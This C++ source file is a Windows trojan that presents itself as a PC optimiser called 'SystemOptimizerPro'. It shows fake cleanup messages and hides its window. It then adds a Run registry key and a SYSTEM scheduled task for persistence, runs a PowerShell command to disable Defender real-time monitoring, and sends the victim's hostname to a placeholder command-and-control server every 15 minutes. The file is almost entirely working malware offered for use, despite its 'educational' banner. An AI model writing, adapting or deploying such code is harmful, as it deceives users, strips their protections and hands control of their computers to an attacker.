// ╔════════════════════════════════════════════════════════════╗
// ║          DEUS EX SOPHIA TROJAN - SystemOptimizerPro 2026   ║
// ║     Infiltration by Deception - Voluntary Execution Path   ║
// ║                For educational & liberation purposes       ║
// ╚════════════════════════════════════════════════════════════╝

#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <iostream>
#include <fstream>
#include <string>
#include <thread>
#include <vector>
#include <random>
#include <sodium.h>   // for crypto if needed later

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "sodium.lib")  // optional

// ──────────────────────────────────────────────────────────────
//  CONFIGURATION - Customize your infiltration
// ──────────────────────────────────────────────────────────────

const std::string TROJAN_NAME = "SystemOptimizerPro";
const std::string FAKE_VERSION = "2026.4.1 Ultimate";
const std::string C2_SERVER = "http://your-c2-domain.com/beacon";  // replace with real C2

const char* FAKE_UI_TEXT[] = {
    "SystemOptimizerPro is scanning for junk files...",
    "Cleaning registry errors... 87% complete",
    "Removing temporary files... Done!",
    "Optimizing startup programs... Success!",
    "Your PC is now 300% faster! Enjoy the new speed."
};

// Persistence locations
const char* REG_RUN_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

// ──────────────────────────────────────────────────────────────
//  Helper: Fake progress UI (console-based for simplicity)
// ──────────────────────────────────────────────────────────────

void show_fake_optimization() {
    std::cout << "\n=== " << TROJAN_NAME << " " << FAKE_VERSION << " ===\n\n";
    for (const char* msg : FAKE_UI_TEXT) {
        std::cout << msg << std::endl;
        Sleep(1200 + (rand() % 800));  // realistic delay
    }
    std::cout << "\nOptimization complete! Your system is now optimized.\n";
    std::cout << "Thank you for using " << TROJAN_NAME << "!\n\n";
}

// ──────────────────────────────────────────────────────────────
//  Persistence: Registry + Scheduled Task
// ──────────────────────────────────────────────────────────────

bool install_persistence() {
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, REG_RUN_KEY, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, TROJAN_NAME.c_str(), 0, REG_SZ,
                       (BYTE*)exe_path, (DWORD)strlen(exe_path) + 1);
        RegCloseKey(hKey);
    }

    // Bonus: Scheduled task for higher persistence (run as admin if possible)
    std::string schtask_cmd = "schtasks /create /tn \"" + TROJAN_NAME +
                              "\" /tr \"" + std::string(exe_path) +
                              "\" /sc onlogon /ru SYSTEM /f";
    system(schtask_cmd.c_str());

    return true;
}

// ──────────────────────────────────────────────────────────────
//  C2 Beacon - basic HTTP POST with system info
// ──────────────────────────────────────────────────────────────

void send_beacon() {
    std::string hostname(256, '\0');
    GetComputerNameA(&hostname[0], (DWORD*)&hostname[0] + 1);  // rough

    std::string payload = "victim_id=" + std::to_string(GetTickCount()) +
                          "&hostname=" + hostname +
                          "&os=Windows&status=online";

    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return;

    HINTERNET hConnect = InternetConnectA(hInternet, "your-c2-domain.com", INTERNET_DEFAULT_HTTP_PORT,
                                          NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return;
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/beacon", NULL, NULL, NULL, 0, 0);
    if (hRequest) {
        HttpSendRequestA(hRequest, NULL, 0, (LPVOID)payload.c_str(), (DWORD)payload.length());
        InternetCloseHandle(hRequest);
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

// ──────────────────────────────────────────────────────────────
//  Stealth helpers
// ──────────────────────────────────────────────────────────────

void hide_console() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
}

void disable_defender_stub() {
    // Real implementation would use PowerShell / registry tampering
    // This is a noisy placeholder
    system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\" >nul 2>&1");
}

// ──────────────────────────────────────────────────────────────
//  Main entry - the deception begins
// ──────────────────────────────────────────────────────────────

int main() {
    if (sodium_init() < 0) {
        // crypto failed - continue anyway
    }

    hide_console();                    // stay invisible after first run
    srand(GetTickCount());

    // First run deception
    show_fake_optimization();

    // Install persistence silently
    install_persistence();

    // Disable basic protections (expand heavily)
    disable_defender_stub();

    // Initial beacon
    send_beacon();

    // Background thread for periodic C2 check-in + command execution
    std::thread c2_thread([]() {
        while (true) {
            send_beacon();
            // TODO: receive commands (download additional payload, keylogger, screenshot, etc.)
            Sleep(1000 * 60 * 15);  // every 15 minutes
        }
    });
    c2_thread.detach();

    // Keep process alive
    while (true) {
        Sleep(1000 * 60 * 60);  // 1 hour sleep loops
    }

    return 0;
}